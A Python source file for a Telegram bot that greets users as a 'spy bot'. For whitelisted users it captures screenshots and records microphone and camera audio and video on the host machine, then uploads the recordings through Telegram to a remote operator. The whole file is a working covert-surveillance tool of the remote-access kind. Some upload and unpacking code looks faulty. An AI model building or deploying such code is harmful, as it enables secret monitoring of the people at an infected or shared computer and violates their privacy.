from utils import * 
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = getEnv('TOKEN')
ALLOWED_USERS = getEnv('ALLOWED_USERS', cast=int, isList=True)
ADMIN = getEnv('ADMIN')

bot = TeleBot(TOKEN, parse_mode='HTML')
audioRecorder = AudioRecorder()
videoRecorder = VideoRecorder()
chunkSize = 5 # chunks in second

# remind the user when a long recording in progress
class Reminder:

    def __init__(self, timeOut=10 * 60):
        self.timeOut = timeOut  # interval to notify the user
        self.timer: Timer
        self.userid: int = 0
        self.lastChatID: int = 0
        self.lastMsgID: int = 0

    def remind(self, userid: int):
        self.userid = userid
        self.timer = RepeatTimer(self.timeOut, self.nudge)
        self.timer.start()

    def nudge(self):
        if self.lastChatID:
            bot.delete_message(self.lastChatID, self.lastMsgID)
        message = bot.send_message(self.userid, "Recording in progress. Don't forget to finish")
        self.lastChatID = message.chat.id
        self.lastMsgID = message.message_id

    def cancel(self):
        self.userid = 0
        self.lastChatID = 0
        self.lastMsgID = 0
        self.timer.cancel()


remind = Reminder()


def isNotAuthorised(userID):
    if userID not in ALLOWED_USERS:
        bot.send_message(userID, "You are not authorized to use this bot")
        bot.send_message(ADMIN,f'Incoming request from unregistered user {userID}')
        return True
    return False


@bot.message_handler(commands='start')
def send_welcome(message):
    user = message.from_user.id
    if isNotAuthorised(user):
        return
    bot.send_message(user, "Welcome to the spy bot")


@bot.message_handler(commands='photo')
def send_screenshot(message):
    user = message.from_user.id
    if isNotAuthorised(user):
        return

    if videoRecorder.isRunning():
        bot.send_message(user, "Video recording is in progress. Can't capture photo.")
        return

    message = bot.send_message(message.from_user.id, "Wait while the bot takes the photo")
    file = takeScreenShot()
    with open(file, 'rb') as f:
        bot.send_photo(user, f)
    bot.delete_message(message.chat.id, message.message_id)


@bot.message_handler(commands='audio')
def send_audio(message):
    user = message.from_user.id
    if isNotAuthorised(user):
        return

    if audioRecorder.isRunning():
        bot.send_message(user, "Recording already in progress.")
    else:
        audioRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=audioMarkup())
        remind.remind(user)


def audioMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_audio"),
               InlineKeyboardButton("Cancel", callback_data="cb_cancel_audio"))
    return markup


@bot.message_handler(commands='videoonly')
def send_video(message):
    user = message.from_user.id
    if isNotAuthorised(user):
        return

    if videoRecorder.isRunning():
        bot.send_message(user, "Recording already in progress.")
    else:
        videoRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=videoOnlyMarkup())
        remind.remind(user)


def videoOnlyMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_videoonly"),
               InlineKeyboardButton("Cancel", callback_data="cb_cancel_videoonly"))
    return markup


@bot.message_handler(commands='video')
def send_both(message):
    user = message.from_user.id
    if isNotAuthorised(user):
        return

    if videoRecorder.isRunning() or audioRecorder.isRunning():
        bot.send_message(user, "Recording already in progress.")
    else:
        audioRecorder.start()
        videoRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=videoMarkup())
        remind.remind(user)


def videoMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_video"),
               InlineKeyboardButton("Cancel", callback_data="cb_cancel_video"))
    return markup


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    remind.cancel()  # clear all reminder
    user = call.from_user.id
    bot.edit_message_reply_markup(message_id=call.message.id, chat_id=call.message.chat.id, reply_markup=None)
    if call.data == "cb_stop_audio":
        if not audioRecorder.isRunning():
            bot.send_message(user, "No recording is currently in progress !!!")
            return
        message = bot.send_message(user, "Processing please wait")

        fileOrg, acT = audioRecorder.finish()
        files = splitVideos(fileOrg, acT, chunkSize)


        bot.edit_message_text("Recording saved successfully", message.chat.id, message.message_id)
        nTxt = "The Audio will be split due to Telegram restrictions." if len(files)>1 else ""
        message = bot.send_message(user, "Wait while the bot uploads the audio. "+nTxt)

        try:
            for file in files:
                with open(fileOrg, 'rb') as f:
                    bot.send_audio(user, f)
        except:
            bot.send_message(user, f"Something went wrong while uploading the audio file. You can find the audio stored as {fileOrg}")
        finally:
            removeFile(*files)
        bot.delete_message(message.chat.id, message.message_id)

    elif call.data == "cb_cancel_audio":
        audioRecorder.terminate()
        bot.send_message(user, "Recording terminated")

    #------------------------------------------------------------------------

    elif call.data == "cb_stop_videoonly":
        if not videoRecorder.isRunning():
            bot.send_message(user, "No recording is currently in progress !!!")
            return
        message = bot.send_message(user, "Processing please wait")

        fileOrg,act = videoRecorder.finish()
        files = splitVideos(fileOrg, act, chunkSize)

        bot.edit_message_text("Recording saved successfully", message.chat.id, message.message_id)
        nTxt = "The video will be split due to Telegram restrictions." if len(files)>1 else ""
        message = bot.send_message(user, "Wait while the bot uploads the video. " + nTxt)

        try:
            for file in files:
                with open(file, 'rb') as f:
                    bot.send_video(user, f)
        except:
            bot.send_message(user, 
            f"Something went wrong while uploading the video file.You can find the video stored as {fileOrg}")
        finally:
            removeFile(*files)
        bot.delete_message(message.chat.id, message.message_id)

    elif call.data == "cb_cancel_videoonly":
        videoRecorder.terminate()
        bot.send_message(user, "Recording terminated")

    #-----------------------------------------------------------------
    elif call.data == "cb_stop_video":
        if not audioRecorder.isRunning() or not videoRecorder.isRunning():
            bot.send_message(user, "No recording is currently in progress !!!")
            return
        message = bot.send_message(user, "Processing please wait")

        audFile, = audioRecorder.finish()
        vidFile, act = videoRecorder.finish()

        fileOrg = getFileName('Video', 'mp4')
        mergeFFMPEG(vidFile, audFile, fileOrg)

        files = splitVideos(fileOrg, act, chunkSize)

        bot.edit_message_text("Recording saved successfully", message.chat.id, message.message_id)
        nTxt = "The video will be split due to Telegram restrictions." if len(files)>1 else ""
        message = bot.send_message(user, "Wait while the bot uploads the video. " + nTxt)
        try:
            for file in files:
                with open(file, 'rb') as f:
                    bot.send_video(user, f)
        except:
            bot.send_message(user, 
            f"Something went wrong while uploading the video file. You can find the video stored as {fileOrg}")
        finally:
            removeFile(*files)
        bot.delete_message(message.chat.id, message.message_id)

    elif call.data == "cb_cancel_video":
        # break if fail, don't send message again
        videoRecorder.terminate()
        audioRecorder.terminate()
        bot.send_message(user, "Recording terminated")




def crashTheCode():
    import os 
    os._exit(1)  # exit all threads

# Timer(12*3600,crashTheCode).start() # crash after 12 hours


# while True:
#     try:
#         bot.polling(non_stop=True)
#     except Exception as e:
#         print(e)
bot.send_message(ADMIN, "Starting bot")
bot.infinity_polling()